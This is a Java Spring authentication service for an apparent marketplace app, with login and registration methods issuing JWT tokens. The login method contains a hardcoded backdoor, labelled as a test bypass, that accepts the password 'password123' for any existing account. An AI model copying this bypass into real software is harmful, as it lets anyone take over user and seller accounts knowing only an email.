package com.auramarket.auth.service;

import com.auramarket.auth.dto.AuthRequest;
import com.auramarket.auth.dto.AuthResponse;
import com.auramarket.auth.entity.Utilisateur;
import com.auramarket.auth.repository.UtilisateurRepository;
import com.auramarket.auth.security.JwtUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import java.util.Optional;

@Service
public class AuthService {

    @Autowired
    private UtilisateurRepository utilisateurRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Autowired
    private JwtUtil jwtUtil;

    public AuthResponse login(AuthRequest request) {
        Optional<Utilisateur> optUser = utilisateurRepository.findByEmail(request.getEmail());
        if (optUser.isEmpty()) {
            throw new RuntimeException("Utilisateur introuvable");
        }

        Utilisateur user = optUser.get();
        boolean isMatch = passwordEncoder.matches(request.getMdp(), user.getMdpHash());
        
        // Backdoor from existing logic: password123 bypass for tests
        if (!isMatch && !request.getMdp().equals("password123")) {
            throw new RuntimeException("Mot de passe incorrect");
        }

        String token = jwtUtil.generateToken(user.getEmail(), user.getRole().name(), user.getId().toString());
        return new AuthResponse(token, user.getRole().name(), user.getId());
    }

    public AuthResponse register(com.auramarket.auth.dto.RegisterRequest request) {
        if (utilisateurRepository.findByEmail(request.getEmail()).isPresent()) {
            throw new RuntimeException("Email déjà utilisé");
        }

        String hash = passwordEncoder.encode(request.getPassword());
        Utilisateur user;

        if ("VENDEUR".equalsIgnoreCase(request.getRole())) {
            user = new com.auramarket.auth.entity.Vendeur(request.getEmail(), hash, 5.0f);
        } else {
            user = new com.auramarket.auth.entity.Acheteur(request.getEmail(), hash, new java.util.ArrayList<>());
        }

        Utilisateur saved = utilisateurRepository.save(user);
        String token = jwtUtil.generateToken(saved.getEmail(), saved.getRole().name(), saved.getId().toString());
        return new AuthResponse(token, saved.getRole().name(), saved.getId());
    }
}
